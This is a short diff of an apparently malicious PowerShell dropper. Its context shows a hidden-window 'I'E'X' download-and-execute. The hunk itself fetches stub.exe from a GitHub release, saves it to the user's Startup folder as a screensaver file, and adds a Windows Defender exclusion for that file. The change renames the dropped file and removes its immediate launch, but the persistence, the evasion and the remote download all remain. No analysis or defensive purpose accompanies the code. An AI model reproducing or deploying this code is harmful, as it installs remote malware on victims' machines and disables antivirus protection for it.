@@ -76,13 +76,12 @@ Start-Process "powershell" -Argument "I'E'X($download)" -WindowStyle Hidden -Pas
 
 
 $url = "https://github.com/43a1723/test/releases/download/siu/stub.exe"
-$output = "$startupfolder\Updated.scr"
+$output = "$startupfolder\Updateclient.scr"
 Add-MpPreference -ExclusionPath $output
 
 if (Test-Path -Path $output) {
     Write-Host "hello"
 } else {
     Invoke-WebRequest -Uri $url -OutFile $output
-    Start-Process $output
 }
 
